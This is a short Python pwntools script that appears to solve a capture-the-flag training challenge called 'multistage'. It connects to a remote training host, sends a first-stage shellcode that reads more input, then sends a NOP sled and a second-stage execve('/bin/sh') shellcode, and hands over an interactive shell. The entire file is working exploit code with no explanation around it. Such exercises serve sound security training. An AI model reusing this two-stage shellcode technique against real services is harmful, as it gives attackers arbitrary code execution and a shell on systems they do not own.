from pwn import *

asm_read = """
mov rsi, rax
xor rax, rax
mov rdi, rax
mov rdx, 0x1000
syscall
"""

asm_code = """
mov rdi, rsi
add rdi, 0x2a
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
"""

context.arch = 'amd64'


shellcode_read = asm(asm_read)
shellcode_stage2 = asm(asm_code)

#p = process(["strace","./multistage"])
#p = process("./multistage")
#gdb.attach(p)
p = remote("bin.training.offdef.it", 2003)

#input("wait...")
p.send(shellcode_read + 2*b"\x90")
#input("send second stage")
p.send(b"\x90"*20 + shellcode_stage2)
p.interactive()
